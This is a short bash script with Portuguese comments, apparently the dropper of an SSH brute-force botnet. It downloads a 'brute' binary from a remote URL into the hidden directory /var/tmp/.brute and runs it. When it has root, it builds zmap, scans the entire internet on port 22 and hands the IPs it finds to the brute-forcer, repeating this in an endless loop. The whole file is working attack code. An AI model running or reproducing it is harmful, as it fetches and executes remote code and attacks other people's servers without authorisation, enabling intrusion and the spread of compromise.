#ATILA_VKZMN


brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'




brute(){

cd /var/tmp  ; cd .brute

wget $brute_url  -O brute || curl  -L $brute_url -o brute

chmod 777 brute && chmod 777 zmap

timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips

timeout   120s    ./brute  #120  segundos para  testa o   ip

return

}




#################################
install_zmap(){

#function no critical

cd /var/tmp 

out_cat=$(cat .brute/zmap )  #troca  cat por ls

if (( ! $?  )) ; then 

echo "zmap instaled ok"

brute

return

fi ; 

#####################################

if [ $EUID -eq  0 ] ; then


apt-get   update -y  &&  apt-get  upgrade  -y   

apt-get  install  -y  unzip  ; apt-get install -y make

apt-get install -y  gcc  || apt-get install -y cc

apt-get install -y  build-essential  ; apt-get install -y cmake

apt-get install -y   libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev libjudy-dev



cd /var/tmp 



wget $url_zmap  -O  zmap.zip  || curl  -L  $url_zmap  -o   zmap.zip #dowload zipedd   zmap


unzip  zmap.zip ; cd zmap-4.4.0  ;  cmake .  ;  make
 
mkdir -p  /var/tmp/.brute

cd src ; cp zmap /var/tmp/.brute/zmap



fi; #nao so root




}





##################

init() {

 
while true ; do

install_zmap
 
sleep   5

done


}



init




